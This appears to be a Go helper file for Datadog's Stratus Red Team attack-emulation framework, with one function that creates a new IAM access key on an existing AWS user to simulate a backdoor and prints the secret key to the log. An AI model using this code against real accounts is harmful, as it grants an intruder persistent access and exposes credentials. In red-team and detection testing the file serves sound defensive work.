package awshelpers

import (
	"context"
	"log"

	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
)

// BackdoorCredentials represents captured IAM credentials
type BackdoorCredentials struct {
	AccessKeyID     string
	SecretAccessKey string
	UserName        string
}

// CreateBackdoorUserAndCaptureCreds creates an IAM access key and returns the credentials
func CreateBackdoorUserAndCaptureCreds(params map[string]string, technique *stratus.AttackTechnique) (*BackdoorCredentials, error) {
	// Create a temporary provider to get AWS connection
	providers := stratus.InitializeCloudProviders()
	defer providers.AWS().GetConnection()
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	userName := params["user_name"]

	log.Println("Creating access key on legit IAM user to simulate backdoor")
	result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{
		UserName: &userName,
	})
	if err != nil {
		return nil, err
	}

	creds := &BackdoorCredentials{
		AccessKeyID:     *result.AccessKey.AccessKeyId,
		SecretAccessKey: *result.AccessKey.SecretAccessKey,
		UserName:        userName,
	}

	log.Println("Successfully created access key " + creds.AccessKeyID)
	log.Println("Secret access key: " + creds.SecretAccessKey)

	return creds, nil
}
